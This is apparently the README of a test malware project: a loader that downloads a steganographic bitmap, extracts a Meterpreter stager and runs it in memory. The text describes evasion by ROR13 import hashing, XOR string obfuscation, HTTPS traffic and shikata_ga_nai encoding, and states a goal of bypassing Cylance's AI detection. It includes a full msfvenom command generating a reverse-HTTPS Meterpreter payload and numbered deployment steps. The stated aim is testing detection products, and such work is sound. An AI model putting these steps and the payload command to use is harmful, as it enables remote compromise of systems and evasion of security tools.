# Description
This is a test malware sample used to load LSB encoded code from the internet. This specific sample template works with LSB encoded bitmap files to extract a stager payload for meterpreter.

The goal is to demonstrate a means of loading malicious code onto a system
without ever touching disk. Additionally, the code leverages a method of
loading require API functionality via accessing the loaded modules directly
from the PEB (Process Execution Block).

This method allows the code to gain access to the Kernel32.dll functions in
order to load additionaly libraries using the LoadLibraryA exported function.
All of the functions loaded leverage a ROR13 hashing technique to avoid any
strings from showing up during static analysis. This makes it much more difficult
for an analysis system or signature detection system to determine the malicious
nature of the binary.

Any other strings that are required in raw form are encoded with a simple XOR
and offset. These strings will no longer be visible to static analysis, but can
easily be decoded at run time to generate required information (URLs, user agents,
etc).

Finally, since LSB steganography is leveraged to download the backdoor, there
are minimal malicious artifacts in the core binary that would allow any detection
from making a determination that this is malicious. The only point when it would
be possible to tell is after the meterpreter shell has been extracted from the
bitmap and loaded directly into memory. The stager payload leverages the executable
encoder shikata-ga-nai to obfuscate the staged payload that is retrieved from the
LSB encoded bitmap file. All communicate done from the meterpreter stager and shell
is done over HTTPS (SSL/TLS) to avoid network based indicators from tripping
security tools.

1. Generating the meterpreter stager:
  `msfvenom -p windows/meterpreter/reverse_https LHOST=10.248.189.74 LPORT=443 -b '\x00\xff' -e x86/shikata_ga_nai -i 3 -f raw`
2. Run the stego encoder with the binary output from above and a desired bitmap
3. Host the bitmap on some HTTP site
4. Set the desired target URL for the bitmap in Utils.h (LSB_TARGET_URL (see HideStrings))
5. Compile and run

Note:
  This is a sample to test malware detection capabilities on security software. The
  provided code was designed to bypass Cylance's AI based detection engine.

Summary of Tactics implemented:

  1. ROR13 hashing - Manually resolving imports
    * https://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/
    * https://www.fireeye.com/blog/threat-research/2012/11/precalculated-string-hashes-reverse-engineering-shellcode.html
  2. String Obfuscation - XOR with Offset
  3. LSB Steganography - encoding malware into benign picture file (used when downloading the meterpreter stage)
  4. In-memory execution - allocates space and launches payload directly from memory (never touch disk)
  5. SSL - communication over SSL to avoid network detection

--------

Future possibilities:

  1. Staged-Encoding - encodes the staged payload to look benign on the wire
  2. Unhooking/remapping binaries
